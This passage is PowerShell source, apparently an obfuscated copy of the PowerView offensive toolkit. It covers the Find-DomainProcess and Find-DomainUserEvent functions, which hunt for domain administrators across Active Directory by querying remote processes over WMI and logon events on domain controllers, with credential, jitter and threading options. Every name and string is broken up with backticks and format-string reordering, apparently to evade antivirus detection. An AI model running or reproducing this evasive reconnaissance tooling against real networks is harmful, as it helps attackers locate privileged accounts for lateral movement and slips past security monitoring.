        if (${p`sboUnDpar`Ame`T`erS}[("{1}{0}{2}"-f'om','UserD','ain')]) { ${us`ERseA`RC`he`Rarg`U`mENtS}[("{0}{1}"-f 'Dom','ain')] = ${USE`Rd`OMaiN} }
        if (${P`SBOUNdPArAm`eT`eRs}[("{0}{2}{1}" -f 'User','DAPFilter','L')]) { ${US`Ers`eArc`HERaRguMentS}[("{1}{0}{2}" -f'APFilte','LD','r')] = ${USE`RL`daPf`ILT`ER} }
        if (${PS`BouN`dP`ARA`mEtERs}[("{1}{2}{0}" -f 'Base','UserSear','ch')]) { ${U`sERsE`A`RcHE`RArgU`ME`NTs}[("{1}{0}{2}"-f 'hBa','Searc','se')] = ${UseR`S`EArchBa`se} }
        if (${PS`BO`UndPa`R`A`mETErs}[("{0}{2}{1}" -f 'UserAdmi','t','nCoun')]) { ${Us`Er`s`EARc`hERaR`gUM`EnTs}[("{1}{3}{2}{0}"-f'nt','Ad','inCou','m')] = ${u`sErAdm`I`N`couNT} }
        if (${Ps`BOun`dpaRA`MeT`E`RS}[("{0}{1}{2}"-f 'Serv','e','r')]) { ${us`ERS`e`ArCHERaRG`UME`NTS}[("{0}{1}"-f 'Ser','ver')] = ${s`eRVeR} }
        if (${PSbO`UN`dp`Arame`TERs}[("{1}{2}{0}{3}" -f'Sco','Sear','ch','pe')]) { ${U`seRsEA`RcH`EraR`guMENts}[("{3}{1}{0}{2}"-f'rchS','a','cope','Se')] = ${Se`ArcH`sCOpE} }
        if (${psb`O`UnDP`AR`Am`eTERs}[("{0}{3}{1}{2}" -f 'R','tPage','Size','esul')]) { ${U`seRSEARc`hERargu`Men`Ts}[("{0}{1}{3}{2}"-f'R','esultP','geSize','a')] = ${re`sultp`A`Ge`SIZE} }
        if (${p`Sbo`UnD`pARAMeters}[("{2}{3}{0}{1}" -f 'rTim','eLimit','Ser','ve')]) { ${USE`RSea`R`che`RaRgUME`Nts}[("{2}{1}{3}{0}" -f 't','meLim','ServerTi','i')] = ${SeRV`Ert`IMeL`I`Mit} }
        if (${PsBo`U`NdPArAME`T`erS}[("{1}{2}{0}"-f'bstone','To','m')]) { ${UsErSEa`Rc`He`RaRG`UmEn`Ts}[("{1}{0}{2}" -f'bs','Tom','tone')] = ${TOMB`s`Tone} }
        if (${psBo`U`ND`PaRameterS}[("{3}{1}{2}{0}" -f'al','edent','i','Cr')]) { ${use`RSeArCheRaR`Gu`M`EN`TS}[("{1}{2}{0}"-f'edential','C','r')] = ${creDeN`T`ial} }


        
        if (${PsbOU`ND`pAr`A`m`ETerS}[("{0}{2}{1}"-f'C','me','omputerNa')]) {
            ${TaR`gEtco`mPuTERS} = ${C`o`mPuTeRNamE}
        }
        else {
            &("{0}{4}{1}{2}{3}" -f'W','i','te-Ver','bose','r') ("{1}{12}{3}{4}{9}{10}{7}{5}{8}{0}{6}{2}{11}" -f' ','[Find-Do','omai','rocess] Queryi','ng comp','rs i','d','e','n the','u','t','n','mainP')
            ${TArgEtco`MP`Ut`E`RS} = &("{3}{1}{0}{2}{4}"-f '-','et','DomainC','G','omputer') @ComputerSearcherArguments | &("{4}{1}{0}{2}{3}" -f 'lect','e','-','Object','S') -ExpandProperty ("{0}{3}{1}{2}"-f 'dn','hostn','ame','s')
        }
        &("{1}{0}{2}" -f'ite-Ver','Wr','bose') "[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length) "
        if (${taRgET`cOm`p`Ut`erS}."LE`NgTh" -eq 0) {
            throw ("{2}{0}{11}{6}{3}{5}{4}{1}{7}{10}{9}{12}{8}" -f 'nd-Dom',' ho','[Fi','oce','No','ss] ','r','st','rate','ound to ','s f','ainP','enume')
        }

        
        if (${P`sbouNdp`AR`AMeters}[("{1}{2}{0}{3}"-f 'ocessNam','P','r','e')]) {
            ${targEt`p`Ro`CeSsNamE} = @()
            ForEach (${T} in ${PrO`C`eSs`NamE}) {
                ${ta`Rge`TprOceSs`N`Ame} += ${T}.("{0}{1}" -f'Spli','t').Invoke(',')
            }
            if (${tAR`GEtprO`c`esSNAMe} -isnot [System.Array]) {
                ${Tar`gEtpr`O`cES`s`NaME} = [String[]] @(${TaRg`eT`prO`C`eSS`NAME})
            }
        }
        elseif (${psBoUN`DpA`RamET`ers}[("{0}{2}{3}{1}" -f 'U','ity','se','rIdent')] -or ${pS`BoU`N`D`P`ARaMeTers}[("{3}{0}{1}{4}{2}"-f'P','F','r','UserLDA','ilte')] -or ${pSbOuN`d`p`ArameT`eRs}[("{2}{3}{0}{1}"-f'chBas','e','UserS','ear')] -or ${pS`Boundp`AR`AmET`E`Rs}[("{0}{1}{3}{4}{2}" -f 'Us','erA','t','dminCo','un')] -or ${P`s`BoUNdp`A`RamE`TeRS}[("{2}{1}{3}{0}{4}"-f 'le','llo','UserA','wDe','gation')]) {
            ${T`ArGe`T`UseRs} = &("{2}{3}{4}{0}{1}"-f'U','ser','Ge','t-Doma','in') @UserSearcherArguments | &("{3}{2}{0}{1}" -f'Obj','ect','-','Select') -ExpandProperty ("{1}{0}{2}{4}{3}" -f'ma','sa','ccount','me','na')
        }
        else {
            ${gRoupS`EarcheR`AR`GUm`EN`Ts} = @{
                ("{0}{1}{2}" -f 'I','dentit','y') = ${useRGROUPID`E`NT`i`TY}
                ("{0}{2}{1}" -f 'Recu','e','rs') = ${TR`Ue}
            }
            if (${p`sBOund`pA`Ram`Et`erS}[("{3}{0}{1}{2}"-f 'D','omai','n','User')]) { ${GrOUpSearchE`R`Ar`GuMEnTs}[("{2}{0}{1}"-f 'oma','in','D')] = ${u`sErD`OMain} }
            if (${P`SbOu`ND`PAR`AMETerS}[("{1}{2}{0}{3}"-f'earchB','User','S','ase')]) { ${gRo`UpS`e`A`RChe`RARg`UmENTs}[("{0}{2}{1}"-f'Sea','e','rchBas')] = ${USE`RsE`AR`Chbase} }
            if (${Ps`BOUndpaRAM`e`TerS}[("{2}{0}{1}" -f 'er','ver','S')]) { ${gr`oU`PSeAr`cheRarGU`MenTS}[("{0}{1}" -f 'S','erver')] = ${se`Rv`ER} }
            if (${p`SBOun`DpA`RameTERs}[("{1}{0}{2}" -f'Scop','Search','e')]) { ${GrO`U`psE`ARch`E`R`ARguMENTS}[("{1}{2}{0}{3}"-f'rc','S','ea','hScope')] = ${SE`ARChsc`oPe} }
            if (${psbo`UndParam`e`Te`Rs}[("{0}{2}{1}{3}" -f 'R','tPageSi','esul','ze')]) { ${G`R`O`Up`SeaRchErarG`UMeNtS}[("{0}{3}{2}{1}" -f 'Res','geSize','Pa','ult')] = ${rEsu`LtP`A`G`eSize} }
            if (${p`SbOU`NDpAr`Ameters}[("{3}{4}{0}{1}{2}" -f 'i','meLim','it','S','erverT')]) { ${Gr`o`UpSE`ArChEr`ARGu`mE`NTS}[("{0}{4}{1}{3}{2}" -f'S','v','imit','erTimeL','er')] = ${sERVe`R`T`imELi`mIt} }
            if (${p`sb`O`UnDParaMe`TERs}[("{2}{0}{1}"-f's','tone','Tomb')]) { ${Grou`PS`eAr`cHERARGumE`NTS}[("{0}{2}{1}" -f'To','bstone','m')] = ${To`mBsT`oNe} }
            if (${ps`BO`UND`ParaMeTe`Rs}[("{2}{3}{0}{1}"-f 'denti','al','C','re')]) { ${g`Ro`UPs`e`ARCH`erArgu`mENts}[("{2}{0}{1}{3}" -f't','ia','Creden','l')] = ${Cr`eD`en`TiAl} }
            ${gro`UpseARCH`erar`GuMenTS}
            ${t`ArGet`USE`Rs} = &("{3}{2}{5}{1}{0}{4}" -f'nGroup','i','et','G','Member','-Doma') @GroupSearcherArguments | &("{0}{1}{2}"-f 'Select-','Ob','ject') -ExpandProperty ("{0}{3}{1}{2}"-f'Mem','a','me','berN')
        }

        
        ${hosT`e`NU`mBlOcK} = {
            Param(${C`ompUt`e`RNaMe}, ${pRoceSsN`A`ME}, ${t`A`RGet`UseRS}, ${CREd`e`NTi`Al})

            ForEach (${TARgeTCOm`Pu`TeR} in ${cOm`p`UT`eR`NAme}) {
                ${uP} = &("{2}{0}{3}{1}" -f't','tion','Tes','-Connec') -Count 1 -Quiet -ComputerName ${TaRG`eT`COmpUTEr}
                if (${UP}) {
                    
                    
                    if (${c`REd`ENtiaL}) {
                        ${PRocE`S`SeS} = &("{1}{2}{3}{0}" -f'ss','Get-WM','IPro','ce') -Credential ${C`Red`entI`AL} -ComputerName ${TaRge`T`C`om`PUteR} -ErrorAction ("{2}{1}{0}{3}{4}" -f 'lyC','lent','Si','o','ntinue')
                    }
                    else {
                        ${P`RoCESs`es} = &("{1}{3}{0}{2}{4}" -f 'MIPr','Get-','oces','W','s') -ComputerName ${tarGetCo`Mp`U`TeR} -ErrorAction ("{2}{4}{3}{0}{1}" -f 'u','e','Silen','ntin','tlyCo')
                    }
                    ForEach (${pR`O`cEsS} in ${PR`oc`EsSEs}) {
                        
                        if (${PRo`CEs`sn`AmE}) {
                            if (${PROC`eS`SN`AME} -Contains ${P`ROCE`sS}."pr`oC`ESSn`AmE") {
                                ${pRoc`E`ss}
                            }
                        }
                        
                        elseif (${TaRg`etU`se`Rs} -Contains ${pR`OcE`ss}."Us`er") {
                            ${p`Ro`CESs}
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        
        if (${pSbo`U`Ndp`ArAmetE`RS}[("{0}{1}"-f'Del','ay')] -or ${psb`OUN`dpaRAME`T`erS}[("{2}{3}{1}{4}{0}"-f's','e','StopOnS','ucc','s')]) {

            &("{2}{1}{3}{0}"-f'e-Verbose','ri','W','t') "[Find-DomainProcess] Total number of hosts: $($TargetComputers.count) "
            &("{3}{0}{4}{1}{2}" -f'e','s','e','Write-V','rbo') ('['+'Fi'+'nd-'+'D'+'omain'+'Process] '+'Dela'+'y: '+"$Delay, "+'Jitter'+': '+"$Jitter")
            ${coUN`TeR} = 0
            ${RA`NdNo} = &("{2}{0}{1}" -f 'jec','t','New-Ob') ("{4}{2}{1}{3}{0}"-f'om','m.Ra','e','nd','Syst')

            ForEach (${tARge`TC`omPUT`Er} in ${tArge`TC`oMPu`TErs}) {
                ${C`O`UntEr} = ${c`ou`NteR} + 1

                
                &("{3}{1}{2}{0}" -f 'eep','-S','l','Start') -Seconds ${Ra`NDNo}.("{1}{0}" -f 't','Nex').Invoke((1-${jI`TTer})*${dE`laY}, (1+${Ji`T`Ter})*${DEL`Ay})

                &("{1}{0}{2}{3}"-f 'ite-','Wr','Ver','bose') "[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                ${REs`ULt} = &("{3}{2}{0}{1}{4}" -f 'm','m','nvoke-Co','I','and') -ScriptBlock ${H`ostenUM`Bl`oCk} -ArgumentList ${TARG`ETcOm`Pu`Ter}, ${T`ArG`eTProcESSnA`mE}, ${TAr`GE`TUserS}, ${cReDEn`T`IaL}
                ${Re`Su`lT}

                if (${RE`su`lT} -and ${sto`po`NsucC`ESs}) {
                    &("{0}{1}{2}" -f'Write-V','erb','ose') ("{4}{1}{6}{5}{7}{2}{8}{3}{0}" -f 'y','ind-Domain',' ea','l','[F','] ','Process','Target user found, returning','r')
                    return
                }
            }
        }
        else {
            &("{0}{3}{2}{1}" -f 'W','bose','ite-Ver','r') ('[Find-'+'Domai'+'nPr'+'ocess]'+' '+'Usi'+'ng '+'t'+'hr'+'eadi'+'ng '+'w'+'ith '+'t'+'h'+'reads: '+"$Threads")

            
            ${scRipT`PAr`A`Ms} = @{
                ("{0}{2}{1}" -f'Proces','Name','s') = ${t`ArGetP`RoceS`SNa`ME}
                ("{3}{1}{2}{0}" -f 'sers','rget','U','Ta') = ${t`ArGeTu`Se`RS}
                ("{0}{1}{2}"-f 'Cred','ent','ial') = ${CrEDE`N`Ti`AL}
            }

            
            &("{4}{0}{3}{5}{2}{1}"-f'Fu','n','io','n','New-Threaded','ct') -ComputerName ${t`AR`ge`Tc`OmpuTerS} -ScriptBlock ${H`osteNu`M`BLOcK} -ScriptParameters ${S`cRI`PtParaMS} -Threads ${THR`E`ADs}
        }
    }
}


function F`i`Nd-`dOMaiN`US`eRevEnT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}" -f 'PS','ShouldPr','ocess'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{6}{8}{1}{7}{2}{5}{4}" -f 'PS','VarsMore','anAssig','Us','ts','nmen','eDeclare','Th','d'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{3}{0}{4}"-f 'PSCredentia','Us','PS','e','lType'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{6}{3}{8}{9}{4}{5}{1}{0}{2}{7}"-f 'w','s','o','v','ainTe','xtForPas','PSA','rd','oidUsin','gPl'}, '')]
    [OutputType({"{1}{0}{4}{2}{3}"-f'V','Power','nEven','t','iew.Logo'})]
    [OutputType({"{4}{2}{5}{1}{0}{3}"-f'dentialLo','Cre','w.Explici','gon','PowerVie','t'})]
    [CmdletBinding(defaULtpARamETersEtnAme = {"{2}{0}{1}"-f 'ai','n','Dom'})]
    Param(
        [Parameter(paramEtERsEtnAMe = "COMPU`TERn`A`ME", PoSItIOn = 0, vaLUEFrOMpIpeLine = ${TR`UE}, VaLuEfROMPiPeLInEbyPrOpeRTyNAME = ${T`RuE})]
        [Alias({"{2}{3}{0}{1}" -f 'nam','e','dnsh','ost'}, {"{1}{0}" -f'e','HostNam'}, {"{1}{0}"-f 'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CoM`p`UteRnAME},

        [Parameter(pAramEterSETnAmE = "D`omAIn")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${d`O`MaiN},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${fi`LTeR},

        [Parameter(vAluEFromPIPeliNebyPROpeRtynaMe = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${S`TA`R`TtimE} =   ( GET-vArIABle ("EZ"+"Y")  ).VALUE::"n`Ow".("{0}{1}"-f'AddD','ays').Invoke(-1),

        [Parameter(valuefrOmPIpeLINEByPropErtynAME = ${t`Rue})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${EN`Dt`IMe} =  $EZy::"N`ow",

        [ValidateRange(1, 1000000)]
        [Int]
        ${M`AXeVE`NtS} = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${US`Er`Id`enTiTY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${uSe`R`DOm`AiN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${u`serlDa`pFilteR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${usE`RseArC`H`B`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f 'a','GroupN','me'}, {"{1}{0}" -f'oup','Gr'})]
        [String[]]
        ${useRgR`Oup`iDEnT`ITY} = ("{2}{1}{0}{3}" -f 'dmi','n A','Domai','ns'),

        [Alias({"{2}{1}{0}" -f'ount','inC','Adm'})]
        [Switch]
        ${u`s`ErADMiN`couNt},

        [Switch]
        ${chec`k`AccESs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{3}{4}{1}"-f'Co','r','Domain','ntr','olle'})]
        [String]
        ${s`ErVEr},

        [ValidateSet({"{1}{0}" -f'se','Ba'}, {"{2}{0}{1}"-f 'e','Level','On'}, {"{1}{0}{2}" -f'ubtr','S','ee'})]
        [String]
        ${SeArc`H`SCope} = ("{0}{1}"-f'S','ubtree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${re`SUL`T`pag`EsiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`ERvE`R`TiM`elimit},

        [Switch]
        ${toMbs`TO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRede`N`TIAL} =  $21gV7e::"E`mPTY",

        [Switch]
        ${StoPOns`U`CceSS},

        [ValidateRange(1, 10000)]
        [Int]
        ${D`ElAy} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${Jitt`er} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${tH`REads} = 20
    )

    BEGIN {
        ${USErSE`Arc`hE`R`ArgUm`en`Ts} = @{
            ("{1}{0}{2}{3}"-f'er','Prop','t','ies') = ("{2}{3}{1}{0}" -f'name','nt','s','amaccou')
        }
        if (${PSbo`U`NdP`AR`AMETERs}[("{0}{1}{2}"-f'Us','e','rIdentity')]) { ${u`serS`Ea`RChErA`RGumENts}[("{1}{0}"-f 'ty','Identi')] = ${USERid`enT`ity} }
        if (${pSB`O`UNdP`Ara`MEt`ERS}[("{2}{0}{1}"-f'Dom','ain','User')]) { ${U`sEr`SeARcHERARGU`M`EntS}[("{0}{1}" -f'Do','main')] = ${U`SeR`domAiN} }
        if (${psbo`Und`ParA`me`TE`Rs}[("{2}{1}{3}{0}"-f 'r','serLDAPFil','U','te')]) { ${Us`e`RS`EaRcHERaR`gumEN`Ts}[("{1}{0}{2}" -f'PFilt','LDA','er')] = ${Us`ERl`DApFI`lTeR} }
        if (${p`sBoUNDP`Ara`mete`Rs}[("{2}{1}{0}{3}{4}"-f'ch','ar','UserSe','Bas','e')]) { ${USeRSEar`c`HeR`ARG`U`M`ENTs}[("{1}{2}{0}" -f 'e','Sea','rchBas')] = ${uSERs`EA`RChb`ASe} }
        if (${Psbo`UndPar`AmetE`Rs}[("{2}{0}{1}"-f 'minCoun','t','UserAd')]) { ${us`eRsear`cH`e`RaRgu`ME`NTs}[("{1}{2}{0}"-f'Count','Ad','min')] = ${use`Ra`DMiNCOUNT} }
        if (${P`Sbo`UndPaR`AMeterS}[("{0}{1}"-f'Serv','er')]) { ${useR`se`ArcH`ErArGUm`EntS}[("{2}{1}{0}" -f'er','v','Ser')] = ${sE`RveR} }
        if (${PSB`O`U`NdPaRAM`E`Ters}[("{1}{0}{2}"-f'chSc','Sear','ope')]) { ${Us`erS`EARcHEr`ARgU`Me`NTs}[("{3}{0}{1}{2}" -f 'ea','rch','Scope','S')] = ${sEA`RchsC`o`pe} }
        if (${psboUNdpA`Ra`meT`Ers}[("{3}{0}{2}{1}"-f'ultPage','ze','Si','Res')]) { ${Us`e`R`SeAR`ChER`Arg`UmentS}[("{2}{0}{1}"-f 'ultP','ageSize','Res')] = ${REsUl`Tp`AGES`IZe} }
        if (${ps`Bo`Un`dPA`Ra`Meters}[("{2}{4}{0}{1}{3}" -f 'rve','rTi','S','meLimit','e')]) { ${U`SE`RsE`ARc`HErARGU`MeNts}[("{3}{2}{1}{0}"-f 't','imeLimi','T','Server')] = ${SeRVERTImEl`I`miT} }
        if (${psBoUn`dPa`RAMEt`ERs}[("{0}{1}{2}" -f 'Tom','b','stone')]) { ${u`seR`SeARch`eRaR`G`U`MEnTs}[("{0}{1}" -f 'Tombston','e')] = ${T`ombs`TOne} }
        if (${pS`Bo`UNDPAr`AME`Ters}[("{2}{0}{1}"-f'ent','ial','Cred')]) { ${Us`eRsEaRcH`eRA`R`gUMeNtS}[("{1}{0}{2}" -f'de','Cre','ntial')] = ${CRED`e`NTiaL} }

        if (${psboUnDPa`RA`m`ET`eRS}[("{0}{1}{2}" -f 'Us','erIdent','ity')] -or ${P`SBou`Nd`pARa`mEte`Rs}[("{0}{2}{1}" -f'UserLD','r','APFilte')] -or ${PsbOu`N`D`p`Ara`MEtErs}[("{2}{3}{1}{4}{0}"-f 'ase','ch','UserSea','r','B')] -or ${p`SbOUnd`paR`AmETeRs}[("{0}{2}{3}{1}"-f'U','nCount','ser','Admi')]) {
            ${TaRg`eT`UsERs} = &("{3}{1}{0}{4}{2}"-f 'm','o','inUser','Get-D','a') @UserSearcherArguments | &("{0}{2}{1}"-f'Sele','ect','ct-Obj') -ExpandProperty ("{2}{1}{4}{3}{0}"-f 'name','ama','s','count','c')
        }
        elseif (${pSB`oUn`DpArAMeTe`Rs}[("{1}{2}{0}{4}{3}"-f't','UserGroupId','en','ty','i')] -or (-not ${P`SBo`UnDParAm`ETErs}[("{0}{1}"-f 'Fil','ter')])) {
            
            ${G`ROuPSeaRchERa`R`GUmen`Ts} = @{
                ("{0}{1}{2}"-f 'I','de','ntity') = ${U`SeRG`ROU`Piden`TITy}
                ("{2}{0}{1}" -f 'ecu','rse','R') = ${T`RUE}
            }
            &("{0}{3}{2}{1}"-f'Write-','se','rbo','Ve') ('Us'+'erGro'+'up'+'Id'+'entity: '+"$UserGroupIdentity")
            if (${p`sbo`Und`PA`RaMETERs}[("{2}{0}{1}"-f'Dom','ain','User')]) { ${g`ROu`p`S`eArChERaR`GuMENtS}[("{0}{1}" -f'Domai','n')] = ${U`sERD`O`mAIN} }
            if (${PsbOun`DP`A`RAMEte`Rs}[("{1}{0}{2}"-f'Sear','User','chBase')]) { ${G`RO`Upse`ARcHe`RaRG`UMe`Nts}[("{2}{1}{0}" -f 'ase','earchB','S')] = ${U`seRSE`A`RchbaSe} }
            if (${p`SBOuNDPa`R`AMeTeRs}[("{0}{1}" -f 'Serve','r')]) { ${grO`UPSEaR`C`HeRarguM`ENTS}[("{0}{1}" -f 'Ser','ver')] = ${s`ER`Ver} }
            if (${pSboun`DpArAM`E`T`E`Rs}[("{1}{2}{0}" -f 'pe','Se','archSco')]) { ${grO`U`P`sEA`RCHerarguME`NTs}[("{1}{0}{2}{3}" -f 'rch','Sea','Scop','e')] = ${se`ArC`hsco`Pe} }
            if (${p`sboUNDp`AR`Am`ETERS}[("{1}{0}{3}{2}"-f's','Re','ageSize','ultP')]) { ${gRo`UpSe`A`RCh`erARGuMe`NtS}[("{3}{4}{0}{2}{1}" -f 'l','ize','tPageS','R','esu')] = ${R`ESu`L`TPAgesi`ZE} }
            if (${PSbOUND`pa`RAmete`RS}[("{1}{2}{0}{4}{3}"-f 'erTime','S','erv','t','Limi')]) { ${GRoU`PSE`ARchErAr`gUmE`Nts}[("{2}{1}{3}{0}"-f 'meLimit','r','Se','verTi')] = ${s`erV`er`TI`MeliMiT} }
            if (${ps`B`ouN`dpaRA`Met`ers}[("{2}{1}{0}"-f'tone','s','Tomb')]) { ${grOUpSEaR`C`HerArgu`MEN`Ts}[("{1}{0}"-f'ne','Tombsto')] = ${T`OM`BStONE} }
            if (${PSBo`U`NDParA`MeTErS}[("{2}{0}{1}"-f'dent','ial','Cre')]) { ${g`ROu`pSEArcH`er`ArGum`entS}[("{1}{2}{0}" -f'dential','Cr','e')] = ${c`R`E`DenTIAl} }
            ${TA`R`GeTUSeRs} = &("{0}{4}{3}{5}{2}{1}" -f 'Ge','ember','M','mai','t-Do','nGroup') @GroupSearcherArguments | &("{2}{1}{3}{0}"-f 't','t-O','Selec','bjec') -ExpandProperty ("{2}{0}{1}" -f 'e','rName','Memb')
        }

        
        if (${p`SBOUnDPa`R`AMe`TerS}[("{1}{2}{3}{0}" -f'erName','Co','mpu','t')]) {
            ${t`Arget`Comput`ErS} = ${coMPut`ERn`Ame}
        }
        else {
            
            ${dCseA`RCHERARG`UM`EnTS} = @{
                ("{1}{0}"-f 'AP','LD') = ${t`RuE}
            }
            if (${p`sboUnDP`AR`A`meTERs}[("{0}{1}"-f'D','omain')]) { ${D`cS`Ea`Rc`Her`ARguMe`NTs}[("{0}{1}" -f 'Dom','ain')] = ${DO`MAIn} }
            if (${psBOunD`p`ARAme`Te`Rs}[("{0}{1}" -f'S','erver')]) { ${DcSEarCHera`R`GUmEN`Ts}[("{0}{1}" -f'Serv','er')] = ${SEr`VER} }
            if (${psBOu`N`D`paramet`ERs}[("{2}{0}{1}"-f 'edent','ial','Cr')]) { ${D`c`SeaRcHE`RargUments}[("{2}{0}{1}" -f'a','l','Credenti')] = ${c`ReDe`NT`ial} }
            &("{3}{0}{1}{2}"-f'rite','-Ver','bose','W') ('['+'F'+'in'+'d-DomainUserEvent]'+' '+'Quer'+'y'+'ing '+'fo'+'r '+'do'+'main '+'cont'+'rol'+'le'+'rs '+'in'+' '+'do'+'ma'+'in: '+"$Domain")
            ${TaRg`e`TCOM`PuTErS} = &("{3}{4}{2}{1}{0}{5}" -f 'mainC','o','D','Ge','t-','ontroller') @DCSearcherArguments | &("{3}{0}{2}{1}" -f'elec','Object','t-','S') -ExpandProperty ("{2}{1}{0}"-f'ame','stn','dnsho')
        }
        if (${TARGET`CO`m`PuTE`RS} -and (${TA`RgE`TCOmpUt`E`Rs} -isnot [System.Array])) {
            ${tArgE`TC`omp`UTE`RS} = @(,${t`A`RgetcoMp`U`TErs})
        }
        &("{0}{1}{3}{2}"-f 'Wri','te-Ver','se','bo') "[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length) "
        &("{1}{0}{2}{3}"-f'rit','W','e-V','erbose') ('[Find-Do'+'m'+'ai'+'nUserE'+'vent'+']'+' '+'Tar'+'get'+'Comput'+'ers '+"$TargetComputers")
        if (${tArG`etCo`M`put`ers}."Le`NG`Th" -eq 0) {
            throw ("{4}{1}{6}{8}{5}{3}{2}{0}{7}{9}{10}" -f'd to ','Find-','n','] No hosts fou','[','serEvent','D','en','omainU','um','erate')
        }

        
        ${HOsT`E`NumBlO`CK} = {
            Param(${coM`pu`T`erNAmE}, ${sTA`R`T`TiME}, ${End`TIMe}, ${mA`x`evENtS}, ${TaR`GETu`Sers}, ${fIl`T`er}, ${c`RE`dENTI`AL})

            ForEach (${t`ArGeTC`OmPUt`Er} in ${C`ompuTERNa`ME}) {
                ${u`p} = &("{1}{2}{0}{3}" -f 'io','Test-Conn','ect','n') -Count 1 -Quiet -ComputerName ${tA`Rg`ETcoMpuTEr}
                if (${u`p}) {
                    ${Dom`AiNUSE`Reve`NTaRgS} = @{
                        ("{1}{2}{0}"-f'e','ComputerN','am') = ${TA`RGe`TcOmP`UtER}
                    }
                    if (${Sta`R`TTImE}) { ${D`OmAIn`US`eREVENtARGS}[("{2}{0}{3}{1}" -f'tar','me','S','tTi')] = ${s`T`ARTti`Me} }
                    if (${E`ND`TiMe}) { ${DO`m`Ain`USE`ReV`eNTARgS}[("{2}{0}{1}"-f 'n','dTime','E')] = ${ENd`Ti`mE} }
                    if (${m`AX`eVENTS}) { ${d`O`m`AiNUsErEVe`NTArgS}[("{2}{1}{0}"-f'vents','E','Max')] = ${MaxevE`N`TS} }
                    if (${cR`E`D`EnTiAl}) { ${dO`m`A`iNUs`ErEvEntarGS}[("{2}{1}{0}"-f 'ial','t','Creden')] = ${C`Red`e`NtiAl} }
                    if (${f`IL`TEr} -or ${TARG`Et`U`Sers}) {
                        if (${ta`RgeT`US`eRs}) {
                            &("{2}{0}{1}{3}" -f'mainUserEv','en','Get-Do','t') @DomainUserEventArgs | &("{1}{2}{0}{3}"-f'r','Wh','e','e-Object') {${tAR`geT`U`SerS} -contains ${_}."targ`ET`U`SernA`Me"}
                        }
                        else {
                            ${oPe`Ra`TOr} = 'or'
                            ${f`iL`TEr}."ke`yS" | &("{4}{1}{3}{0}{2}"-f '-O','ac','bject','h','ForE') {
                                if ((${_} -eq 'Op') -or (${_} -eq ("{1}{0}" -f'erator','Op')) -or (${_} -eq ("{2}{0}{1}" -f 'a','tion','Oper'))) {
                                    if ((${fILt`eR}[${_}] -match '&') -or (${F`iLTER}[${_}] -eq 'and')) {
                                        ${oP`erAt`OR} = 'and'
                                    }
                                }
                            }
                            ${kE`yS} = ${F`ILTeR}."K`Eys" | &("{2}{1}{3}{0}" -f 'bject','here','W','-O') {(${_} -ne 'Op') -and (${_} -ne ("{2}{0}{1}"-f'at','or','Oper')) -and (${_} -ne ("{1}{2}{0}"-f 'tion','Ope','ra'))}
                            &("{5}{1}{0}{3}{4}{2}" -f'-Domai','t','rEvent','n','Use','Ge') @DomainUserEventArgs | &("{3}{1}{2}{0}"-f 't','je','c','ForEach-Ob') {
                                if (${O`PERatOr} -eq 'or') {
                                    ForEach (${K`eY} in ${kE`ys}) {
                                        if (${_}."$Key" -match ${FiL`TEr}[${k`eY}]) {
                                            ${_}
                                        }
                                    }
                                }
                                else {
                                    
                                    ForEach (${k`EY} in ${KE`ys}) {
                                        if (${_}."$Key" -notmatch ${fI`LT`er}[${k`eY}]) {
                                            break
                                        }
                                        ${_}
                                    }
                                }
                            }
                        }
                    }
                    else {
                        &("{2}{3}{1}{0}"-f 'rEvent','se','Get-Doma','inU') @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        
        if (${p`SBounD`p`Aramete`RS}[("{0}{1}"-f 'Del','ay')] -or ${PSbouNdPAr`Am`et`ERs}[("{2}{0}{1}" -f'topOnSu','ccess','S')]) {

            &("{1}{0}{2}"-f 'e-Ver','Writ','bose') "[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count) "
            &("{2}{0}{3}{1}"-f'Ve','e','Write-','rbos') ('[F'+'ind'+'-Do'+'main'+'UserEven'+'t] '+'De'+'l'+'ay: '+"$Delay, "+'Jit'+'te'+'r: '+"$Jitter")
            ${C`OU`NtER} = 0
            ${R`A`NDNO} = &("{1}{2}{0}"-f'ect','N','ew-Obj') ("{3}{0}{1}{2}" -f'tem.Ra','nd','om','Sys')

            ForEach (${TARgEtc`Om`P`UTer} in ${t`ARg`EtCOMpu`Te`RS}) {
                ${Coun`TER} = ${cO`UNter} + 1

                
                &("{1}{0}{2}" -f 'Sle','Start-','ep') -Seconds ${rand`No}.("{1}{0}"-f'xt','Ne').Invoke((1-${j`i`TteR})*${d`E`LAy}, (1+${J`It`Ter})*${D`El`Ay})

                &("{3}{2}{4}{0}{1}" -f'erbo','se','r','W','ite-V') "[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
